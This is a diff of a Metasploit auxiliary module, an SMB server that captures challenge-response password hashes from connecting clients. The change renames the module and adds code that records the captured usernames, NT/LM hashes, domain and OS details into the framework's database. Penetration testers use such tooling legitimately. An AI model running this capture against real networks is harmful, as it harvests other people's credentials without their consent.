@@ -1,5 +1,5 @@
 ##
-# $Id$
+# $Id: smb_sniffer.rb 5241 2007-12-31 03:03:08Z hdm $
 ##
 
 ##
@@ -14,15 +14,15 @@ require 'msf/core'
 
 module Msf
 
-class Auxiliary::Server::SMBSniffer < Msf::Auxiliary
+class Auxiliary::Server::Capture::SMBSniffer < Msf::Auxiliary
 
 	include Auxiliary::Report
 	include Exploit::Remote::SMBServer
 	
 	def initialize
 		super(
-			'Name'        => 'SMB Server Challenge/Response Sniffer',
-			'Version'     => '$Revision$',
+			'Name'        => 'Authentication Capture: SMB',
+			'Version'     => '$Revision: 5241 $',
 			'Description'    => %q{
 				This module provides a SMB service that can be used to
 			capture the challenge-response password hashes of SMB client
@@ -194,6 +194,35 @@ class Auxiliary::Server::SMBSniffer < Msf::Auxiliary
 			"OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}"
 		)
 		
+		report_auth_info(
+			:host  => smb[:ip],
+			:proto => 'smb_challenge',
+			:targ_host => datastore['SRVHOST'],
+			:targ_port => datastore['SRVPORT'],
+			:user => smb[:username],
+			:pass => 
+				( nt_hash ? nt_hash : "<NULL>" ) + ":" + (lm_hash ? lm_hash : "<NULL>" ),
+			:extra => "NAME=#{smb[:nbsrc]} DOMAIN=#{smb[:domain]} OS=#{smb[:peer_os]}"
+		)
+		
+		report_note(
+			:host  => smb[:ip],
+			:type  => "smb_peer_os",
+			:data  => smb[:peer_os]
+		) if smb[:peer_os]
+
+		report_note(
+			:host  => smb[:ip],
+			:type  => "smb_peer_lm",
+			:data  => smb[:peer_lm]
+		) if smb[:peer_lm]
+
+		report_note(
+			:host  => smb[:ip],
+			:type  => "smb_domain",
+			:data  => smb[:domain]
+		) if smb[:domain]
+						
 		fd = File.open(datastore['LOGFILE'], "a")
 		fd.puts(
 			[
@@ -255,8 +284,5 @@ class Auxiliary::Server::SMBSniffer < Msf::Auxiliary
 	end
 
 
-
-
 end
-
 end
